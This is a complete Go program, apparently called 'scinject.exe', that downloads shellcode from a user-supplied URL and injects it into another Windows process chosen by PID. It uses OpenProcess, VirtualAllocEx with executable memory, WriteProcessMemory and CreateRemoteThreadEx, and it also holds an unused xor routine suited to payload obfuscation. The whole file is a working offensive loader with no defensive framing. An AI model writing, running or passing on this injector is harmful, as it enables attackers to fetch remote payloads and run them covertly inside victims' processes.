package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"unsafe"

	"golang.org/x/sys/windows"
)

func xor(b, k []byte) ([]byte, error) {
	if len(k) == 0 {
		return nil, fmt.Errorf("Key too short")
	}

	xb := make([]byte, 0, len(b))
	for i := 0; i < len(b); i++ {
		xb = append(xb, b[i]^k[i%len(k)])
	}

	return xb, nil
}

func fetchPayload(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func main() {
	var url string
	flag.StringVar(&url, "url", "", "URL to shellcode")
	flag.Parse()

	if flag.NArg() < 1 {
		fmt.Println("Error: Missing PID Arg. Usage: scinject.exe <PID>")
		os.Exit(1)
	}

	if url == "" {
		fmt.Println("No URL provided")
		os.Exit(1)
	}

	sc, err := fetchPayload(url)
	if err != nil {
		fmt.Printf("Error: fetch failure: %v\n", err)
		os.Exit(1)
	}

	pid, err := strconv.ParseUint(flag.Arg(0), 10, 32)
	if err != nil {
		fmt.Printf("Error parsing PID %v\n", err)
		os.Exit(1)
	}
	pid32 := uint32(pid)

	/* Open Process */
	hProcess, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid32)
	if err != nil {
		fmt.Printf("Error opening process {%v}: %v\n", pid32, err)
		os.Exit(1)
	}
	defer windows.CloseHandle(hProcess)

	fmt.Printf("Handle received on process {%v}: %v\n", pid32, hProcess)

	kernel32dll := windows.NewLazyDLL("kernel32.dll")
	pVirtualAllocEx := kernel32dll.NewProc("VirtualAllocEx")
	pWriteProcessMemory := kernel32dll.NewProc("WriteProcessMemory")
	pCreateRemoteThreadEx := kernel32dll.NewProc("CreateRemoteThreadEx")

	rAddr, _, err := pVirtualAllocEx.Call(uintptr(hProcess),
		uintptr(0),
		uintptr(len(sc)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE))
	if rAddr == 0 {
		fmt.Printf("VirtualAllocEx failed: %v\n", err)
		os.Exit(1)
	}

	/* write to buffer using NewProc */
	var bytesWritten uintptr
	rWrite, _, errW := pWriteProcessMemory.Call(
		uintptr(hProcess),
		rAddr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if rWrite == 0 {
		fmt.Printf("WriteProcessMemory failed: %v\n", errW)
		os.Exit(1)
	}

	/* creating remote threads */
	var tid uint32
	hThread, _, errT := pCreateRemoteThreadEx.Call(uintptr(hProcess),
		uintptr(0),
		uintptr(0),
		rAddr,
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&tid)))

	if hThread == 0 {
		fmt.Printf("CreateRemoteThreadEx failed: %v\n", errT)
		os.Exit(1)
	}

	fmt.Printf("Successful thread creation TID:[%v]\n", tid)
	defer windows.CloseHandle(windows.Handle(hThread))

	/* Wait for thread to finish */
	event, errWait := windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
	if errWait != nil {
		fmt.Printf("Error waiting for thread{%v}: %v\n", tid, errWait)
	}
	fmt.Printf("Event Created :%v\n", event)
}
